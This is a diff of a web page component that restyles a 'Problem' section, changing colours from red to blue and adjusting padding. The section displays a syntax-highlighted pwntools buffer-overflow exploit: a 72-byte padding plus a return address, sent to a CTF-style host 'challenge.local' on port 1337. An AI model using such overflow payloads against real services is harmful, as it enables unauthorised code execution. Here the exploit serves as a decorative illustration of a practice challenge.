@@ -7,7 +7,8 @@ import { Card } from "@/components/ui/card";
         
         {/* Problem Section */}
         <div class="space-y-8 relative z-20">
-            <div class="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-red-500/10 text-red-500 text-xs font-medium uppercase tracking-wider border border-red-500/20 backdrop-blur-sm">
+            {/* Changed to Blue/Accent */}
+            <div class="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-accent/10 text-accent text-xs font-medium uppercase tracking-wider border border-accent/20 backdrop-blur-sm">
                 The Problem
             </div>
             <h2 class="text-3xl md:text-4xl lg:text-5xl font-bold tracking-tight text-foreground">
@@ -20,8 +21,8 @@ import { Card } from "@/components/ui/card";
 
         {/* Code Snippet Visual */}
         <div class="relative group perspective-1000">
-            {/* Glow effect behind the code window */}
-            <div class="absolute -inset-8 bg-gradient-to-r from-accent/20 to-purple-500/20 rounded-[3rem] blur-3xl opacity-40 group-hover:opacity-60 transition-opacity duration-1000 ease-out"></div>
+            {/* Glow effect - Unified Blue */}
+            <div class="absolute -inset-8 bg-gradient-to-r from-blue-600/30 to-cyan-500/30 rounded-[3rem] blur-3xl opacity-40 group-hover:opacity-60 transition-opacity duration-1000 ease-out"></div>
             
             <Card className="relative bg-[#1e1e1e] border-none shadow-2xl rounded-xl overflow-hidden transform transition-all duration-700 ease-[cubic-bezier(0.25,0.1,0.25,1)] hover:scale-[1.02] hover:rotate-1 ring-1 ring-white/10">
                 {/* Window Controls */}
@@ -33,21 +34,19 @@ import { Card } from "@/components/ui/card";
                 </div>
                 
                 {/* Code Content */}
-                <div class="p-6 overflow-x-auto custom-scrollbar">
+                <div class="pt-2 pb-6 px-6 overflow-x-auto custom-scrollbar">
                     <pre class="font-mono text-sm leading-relaxed">
 <span class="text-[#c586c0]">import</span> <span class="text-[#9cdcfe]">socket</span>
 <span class="text-[#c586c0]">from</span> <span class="text-[#9cdcfe]">pwn</span> <span class="text-[#c586c0]">import</span> <span class="text-[#dcdcaa]">*</span>
 
-<span class="text-[#6a9955]"># Target connection</span>
 <span class="text-[#9cdcfe]">HOST</span> = <span class="text-[#ce9178]">'challenge.local'</span>
 <span class="text-[#9cdcfe]">PORT</span> = <span class="text-[#b5cea8]">1337</span>
 
 <span class="text-[#c586c0]">def</span> <span class="text-[#dcdcaa]">exploit</span>():
     <span class="text-[#9cdcfe]">r</span> = <span class="text-[#dcdcaa]">remote</span>(<span class="text-[#9cdcfe]">HOST</span>, <span class="text-[#9cdcfe]">PORT</span>)
     
-    <span class="text-[#6a9955]"># Craft payload for buffer overflow</span>
     <span class="text-[#9cdcfe]">payload</span> = <span class="text-[#ce9178]">b'A'</span> * <span class="text-[#b5cea8]">72</span>
-    <span class="text-[#9cdcfe]">payload</span> += <span class="text-[#dcdcaa]">p64</span>(<span class="text-[#b5cea8]">0x401196</span>) <span class="text-[#6a9955]"># win()</span>
+    <span class="text-[#9cdcfe]">payload</span> += <span class="text-[#dcdcaa]">p64</span>(<span class="text-[#b5cea8]">0x401196</span>)
 
     <span class="text-[#9cdcfe]">r</span>.<span class="text-[#dcdcaa]">sendlineafter</span>(<span class="text-[#ce9178]">b'&gt; '</span>, <span class="text-[#9cdcfe]">payload</span>)
     <span class="text-[#9cdcfe]">r</span>.<span class="text-[#dcdcaa]">interactive</span>()
